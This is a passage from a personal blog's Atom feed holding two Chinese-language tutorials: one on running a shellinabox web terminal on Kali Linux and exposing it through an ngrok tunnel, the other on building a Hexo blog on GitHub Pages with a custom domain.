    <content type="html"><![CDATA[<a id="more"></a><h1 id="一-kali中安装shellinabox"><a href="#一-kali中安装shellinabox" class="headerlink" title="一. kali中安装shellinabox"></a>一. kali中安装shellinabox</h1><p>准备：shellinabox、ngrok</p><p>apt-get install shellinabox</p><p><img src="/2019/03/22/webkali/1.png" alt="示例图片" title="例"></p><h1 id="二-创建kali账号开启shellinabox"><a href="#二-创建kali账号开启shellinabox" class="headerlink" title="二. 创建kali账号开启shellinabox"></a>二. 创建kali账号开启shellinabox</h1><p>useradd ghacker</p><p>passwd ghacker</p><p><img src="/2019/03/22/webkali/2.png" alt="示例图片" title="例"></p><p>开启shellinabox：</p><p>shellinaboxd -b -t</p><p><img src="/2019/03/22/webkali/3.png" alt="示例图片" title="例"></p><p>-b 后台启动</p><p>-t http方式启动</p><p>可以在kali系统中用通过 <a href="http://ip:4200访问web版kali" target="_blank" rel="noopener">http://ip:4200访问web版kali</a></p><p><img src="/2019/03/22/webkali/4.png" alt="示例图片" title="例"></p><p>无论哪种安装方式，安装后可编辑/etc/sysconfig/shellinaboxd配置文件来更改端口，默认是4200端口</p><h1 id="三-外网映射"><a href="#三-外网映射" class="headerlink" title="三.  外网映射"></a>三.  外网映射</h1><p>去ngrok的官网，隧道开通，香港免费的。协议选http，隧道名称跟前置域名自定义，本地端口写kali服务器的端口，ip写kali的ip，端口就写ssh web的端口4200，http验证用户名跟密码选填，最后直接点确定添加。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;一-kali中安装shellinabox&quot;&gt;&lt;a href=&quot;#一-kali中安装shellinabox&quot; class=&quot;headerlink&quot; title=&quot;一. kali中安装shellinabox&quot;&gt;&lt;/a&gt;一. kali
      
    
    </summary>
    
      <category term="web" scheme="http://yoursite.com/categories/web/"/>
    
    
      <category term="linux" scheme="http://yoursite.com/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>blog_create</title>
    <link href="http://yoursite.com/2019/03/17/blog-create/"/>
    <id>http://yoursite.com/2019/03/17/blog-create/</id>
    <published>2019-03-17T13:13:26.000Z</published>
    <updated>2019-07-22T13:36:21.509Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h1 id="一-使用工具"><a href="#一-使用工具" class="headerlink" title="一.使用工具"></a>一.使用工具</h1><p>Git+Hexo+Nodejs+GitHub账号+买来的域名</p><h4 id="ps：配置ssh"><a href="#ps：配置ssh" class="headerlink" title="ps：配置ssh"></a>ps：配置ssh</h4><p>+本地生成公钥私钥</p><p><code>$ssh-keygen -t rsa -C &quot;你的邮件地址&quot;</code></p><p>+添加公钥到 Github</p><p>1.根据上一步的提示，找到公钥文件（默认为id_rsa.pub），用记事本打开，全选并复制。<br>2.登录 Github，右上角 头像 -&gt; Settings —&gt; SSH keys —&gt; Add SSH key。把公钥粘贴到key中，填好title并点击 Add key。</p><p>3.git bash中输入命令$ssh -T <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>，选yes，等待片刻可看到成功提示</p><h1 id="二-安装和搭建"><a href="#二-安装和搭建" class="headerlink" title="二.安装和搭建"></a>二.安装和搭建</h1><p>1.git：官网安装，注册GitHub，打开 Git Bash,接下来的命令均在Git Bash中执行</p><p>ps：最好改个镜像： ‘npm config set registry <a href="http://registry.npm.taobao.org&#39;" target="_blank" rel="noopener">http://registry.npm.taobao.org&#39;</a></p><p>2.安装node.js</p><p>3.hexo：在安装hexo的文件夹中打开Git，输入</p><p> <code>$npm install -g hexo</code></p><p>4.安装依赖包</p><p><code>$npm install</code></p><p>5.新建Github的仓库 仓库名必须为你的Github名.github.io，不然不能使用Github Pages服务</p><p>6.输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br><span class="line"></span><br><span class="line">hexo g</span><br><span class="line"></span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>7.打开浏览器输入localhost:4000查看：</p><p><img src="/2019/03/17/blog-create/1.png" alt="示例图片" title="例"><br>这个样子就说明成功了，这个就是hexo默认的博客主题。</p><h2 id="三-将本地博客上传到github"><a href="#三-将本地博客上传到github" class="headerlink" title="三.将本地博客上传到github"></a>三.将本地博客上传到github</h2><p>1.修改hexo站点的配置文件</p><p><img src="/2019/03/17/blog-create/2.png" alt="示例图片" title="例"></p><p>2.部署一下</p><p><code>npm install hexo-deployer-git --save</code></p><p>装个插件</p><p><code>hexo d</code></p><p>插件的命令</p><p>3.访问网站：<a href="https://LylTxmy.github.io(当时没有截图，假装有好了)" target="_blank" rel="noopener">https://LylTxmy.github.io(当时没有截图，假装有好了)</a></p><h1 id="四-域名绑定"><a href="#四-域名绑定" class="headerlink" title="四.域名绑定"></a>四.域名绑定</h1><p>1.去阿里云买了个一年几块的top域名</p><p>2.实名认证+备案</p><p>3.添加两个解析：</p><p>记录类型：CNAME</p><p>主机类型：www</p><p>记录值：用户名.github.io</p><p>记录类型：A</p><p>主机类型：@</p><p>记录值：填上用ping 用户名.github.io 返回的IP</p><p>4.</p><p>然后到你博客根目录/source 目录下创建一个新文件CNAME<br>在里面写上你刚刚配置的路径，我的是<a href="http://www.cancrie.top，就直接在CNAME文件中写上这个地址" target="_blank" rel="noopener">www.cancrie.top，就直接在CNAME文件中写上这个地址</a></p><p>5.</p><p>在 github 上面，打开 <a href="http://username.github.io/" target="_blank" rel="noopener">username.github.io</a> 项目的（Settings）设置，然后在 GitHub Pages<code>的</code>Custom domain设置里填上购买的域名。</p><p>6.</p><p>然后执行以下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>让后访问你自己的地址就可以跳转到博客了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h1 id=&quot;一-使用工具&quot;&gt;&lt;a href=&quot;#一-使用工具&quot; class=&quot;headerlink&quot; title=&quot;一.使用工具&quot;&gt;&lt;/a&gt;一.使用工具&lt;/h1&gt;&lt;p&gt;Git+Hexo+Nodejs+GitHub账号+买来的域名&lt;/p&gt;
&lt;
      
    
    </summary>
    
      <category term="web" scheme="http://yoursite.com/categories/web/"/>
    
    
      <category term="blog" scheme="http://yoursite.com/tags/blog/"/>
    
  </entry>
  
</feed>
